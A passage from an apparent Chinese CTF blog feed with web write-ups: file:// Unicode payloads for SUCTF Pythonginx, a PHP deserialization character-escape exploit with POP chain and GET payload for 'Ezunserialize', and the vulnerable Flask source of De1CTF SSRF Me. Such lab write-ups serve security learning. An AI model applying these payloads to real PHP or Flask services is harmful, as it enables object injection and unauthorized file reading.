data-srcset="/2020/10/10/SUCTF-2019-Pythonginx/1602399072117.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1602399072117"></p><h3 id="0x05-payload"><a href="#0x05-payload" class="headerlink" title="0x05 payload"></a>0x05 payload</h3><blockquote><p>file://suctf.c℆sr/local/nginx/conf/nginx.conf</p></blockquote><p><img src="/2020/10/10/SUCTF-2019-Pythonginx/1602398956112.png" class="lazyload" data-srcset="/2020/10/10/SUCTF-2019-Pythonginx/1602398956112.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1602398956112"></p><blockquote><p>file://suctf.c℆sr/fffffflag</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[安恒月赛]Ezunserialize</title>
      <link href="2020/10/02/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-Ezunserialize/"/>
      <url>2020/10/02/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-Ezunserialize/</url>
      
        <content type="html"><![CDATA[<p>反序列化字符逃逸漏洞，借这个题学一下</p><span id="more"></span><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . chr(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;gqy&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="string">&#x27;a&#x27;</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;nice&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span></span><br><span class="line"><span class="variable">$b</span> = unserialize(read(write(serialize(<span class="variable">$a</span>)))); </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="pop链的构造"><a href="#pop链的构造" class="headerlink" title="pop链的构造"></a>pop链的构造</h3><p>题目源码比较简单，只有三个类和两个函数</p><p><img src="/2020/10/02/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-Ezunserialize/1601629539060.png" class="lazyload" data-srcset="/2020/10/02/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-Ezunserialize/1601629539060.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1601629539060"></p><p>很明显最终的利用点是文件包含从而拿到flag</p><p>通过这三个类中的魔术方法的调用方式</p><ul><li><p>__construct</p><p>   PHP 5 允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。   </p></li><li><p>__destruct</p><p>​    PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言，如   C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行.</p></li><li><p>__toString </p><p>   用于一个类被当成字符串时应怎样回应。例如    <code>echo $obj;</code> 应该显示些什么。此方法必须返回一个字符串，否则将发出一条    <strong><code>E_RECOVERABLE_ERROR</code></strong> 级别的致命错误。    </p></li></ul><p>分析可知通过A类中____construct()方法得到两个可控参数可以实例化B类中的____destruct()方法输出属性同时B类中属性可控从而实例化C类控制C类的属性调用__toString()从而包含flag文件拿到flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class A::construct()--&gt;class B::destruct()--&gt;class C::toString()</span><br></pre></td></tr></table></figure><p>根据源码生成发序列化字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;gqy&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="string">&#x27;a&#x27;</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;nice&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> B();</span><br><span class="line"><span class="variable">$b</span>-&gt;b=<span class="keyword">new</span> C();</span><br><span class="line"><span class="variable">$b</span>-&gt;b-&gt;c=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> A(<span class="string">&quot;0&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;0&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h3><h4 id="字符逃逸原理"><a href="#字符逃逸原理" class="headerlink" title="字符逃逸原理"></a>字符逃逸原理</h4><p>字符逃逸是通过对生成的反序列化字符串进行字符数量不等的变化，从而使得部分属性统计数目不正确，但是通过一些优美的构造填补一些字符可以使其通过检测并且符合反序列化的语法，从而造成对象注入等漏洞，填补的字符处可以用来对象注入</p><p>比如这个题</p><p><img src="/2020/10/02/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-Ezunserialize/1601815940162.png" class="lazyload" data-srcset="/2020/10/02/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-Ezunserialize/1601815940162.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1601815940162"></p><p>通过 write 和 read 函数对数据进行了替换处理，三位与六位的置换</p><p><img src="/2020/10/02/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-Ezunserialize/1601816019913.png" class="lazyload" data-srcset="/2020/10/02/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-Ezunserialize/1601816019913.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1601816019913"></p><p>只有 $a 与$b用于传参，先序列化处理后反序列化处理，所以我们构造出的对象需要存储在变量$b中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>就是这部分如果序列化后到字符串中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">71</span>:<span class="string">&quot;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span><span class="string">B&quot;:1:&#123;s:1:&quot;</span><span class="string">b&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>显然我们把这部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:71:&quot;</span> <span class="comment">#一共是23位</span></span><br></pre></td></tr></table></figure><p>通过利用字符不等位置换函数，吞并到 username属性的字符串值当中 并且在b前面加入<code>*&quot;;</code>星号是匹配符可为任何字符串</p><p>利用字符置换函数，用于吞并这23位，显然我们发现<code>&quot;/0/0/0&quot;</code>是六个字符 <code>char(0).*.char(0)</code>是三个字符</p><p>一次替换就能吞并（逃逸）三个字符，我们需要吞并23位，再在b参数开头处补上一位即为24可以被三整除</p><p>所以payload为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span></span><br><span class="line">b=<span class="string">b&quot;;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span><span class="string">B&quot;:1:&#123;s:1:&quot;</span><span class="string">b&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h3><p>反序列化字符逃逸，感觉难点在数数（咦？这不是小学生有手就行吗？好像是，我太菜了）</p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF-2019-SSRF Me</title>
      <link href="2020/09/24/De1CTF-2019-SSRF-Me/"/>
      <url>2020/09/24/De1CTF-2019-SSRF-Me/</url>
      
        <content type="html"><![CDATA[<p>md5的hash拓展攻击，感觉有点意思，记录下</p><span id="more"></span><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)) </span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="分析流程"><a href="#分析流程" class="headerlink" title="分析流程"></a>分析流程</h3><p>F12给了后端程序 是利用python Flask框架写的</p><p>对于python写的后端程序，先看路由</p><p><img src="/2020/09/24/De1CTF-2019-SSRF-Me/1600940739233.png" class="lazyload" data-srcset="/2020/09/24/De1CTF-2019-SSRF-Me/1600940739233.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1600940739233"></p><p><img src="/2020/09/24/De1CTF-2019-SSRF-Me/1600940755120.png" class="lazyload" data-srcset="/2020/09/24/De1CTF-2019-SSRF-Me/1600940755120.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1600940755120"></p><p>通过get方式传入param，其余字符串变量都不可控，然后得到一组md5值</p><p><img src="/2020/09/24/De1CTF-2019-SSRF-Me/1600940809757.png" class="lazyload" data-srcset="/2020/09/24/De1CTF-2019-SSRF-Me/1600940809757.png" 